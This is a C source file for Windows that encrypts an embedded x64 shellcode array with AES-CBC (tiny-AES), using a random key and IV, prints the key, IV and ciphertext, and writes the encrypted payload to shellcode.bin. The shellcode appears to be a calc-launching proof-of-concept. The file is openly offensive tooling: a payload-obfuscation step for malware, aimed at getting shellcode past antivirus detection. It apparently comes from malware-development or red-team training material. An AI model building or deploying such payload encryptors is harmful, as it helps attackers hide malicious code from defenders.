#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// the Visual Studio project should include:
// aes.h - https://github.com/kokke/tiny-AES-c/blob/master/aes.h
// aes.c - https://github.com/kokke/tiny-AES-c/blob/master/aes.c

#define KEYSIZE				32
#define IVSIZE				16

unsigned char Data[] = {
	// ... (shellcode bytes)
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}
}

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

// Function that will take a buffer, and copy it to another buffer that is a multiple of 16 in size
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PaddedSize = NULL;

	// Calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// Allocating buffer of size PaddedSize
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// Cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// Copying old buffer to a new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	// Saving results
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}

int main() {

	// Struct needed for tiny-AES library
	struct AES_ctx ctx;

	BYTE pKey[KEYSIZE];				// KEYSIZE is 32
	BYTE pIv[IVSIZE];				// IVSIZE is 16

	srand(time(NULL));				// The seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);		// Generating the key bytes

	srand(time(NULL) ^ pKey[0]);			// The seed to generate the iv (using the first byte from the key to add more spice)
	GenerateRandomBytes(pIv, IVSIZE);		// Generating the IV

	// Printing key and IV to the console
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	printf("[i] Base Address of Shellcode : 0x%p \n", Data);
	printf("[!] Encrypting shellcode..\n");

	// Initilizing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Initializing variables that will hold the new buffer base address and its size in case padding is required
	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PAddedSize = NULL;

	HANDLE file;
	DWORD bytes_written;

	// Padding buffer, if needed
	if (sizeof(Data) % 16 != 0) {
		PaddBuffer(Data, sizeof(Data), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", PaddedBuffer, PAddedSize);
		printf("[i] Base Address of Encrypted Shellcode (Padded) : 0x%p \n", PaddedBuffer);

		size_t encshellcodeSize = PAddedSize;
		file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("Unable to create bin file.\n");
			return 1;
		}

		if (!WriteFile(file, PaddedBuffer, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
			fprintf(stderr, "Failed to write to file.\n");
			CloseHandle(file);
			return 1;
		}

		printf("shellcode.bin file created!");

		//clean up
		CloseHandle(file);
	}
	else {
		// No padding is required, encrypt Data directly
		AES_CBC_encrypt_buffer(&ctx, Data, sizeof(Data));
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", Data, sizeof(Data));
		printf("[i] Base Address of Encrypted Shellcode (Non-Padded) : 0x%p \n", Data);

		size_t encshellcodeSize = sizeof(Data);
		file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("Unable to create bin file.\n");
			return 1;
		}

		if (!WriteFile(file, Data, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
			fprintf(stderr, "Failed to write to file.\n");
			CloseHandle(file);
			return 1;
		}

		printf("shellcode.bin file created!");

		//clean up
		CloseHandle(file);
	}

	// Freeing PaddedBuffer, if needed
	if (PaddedBuffer != NULL) {
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;

}
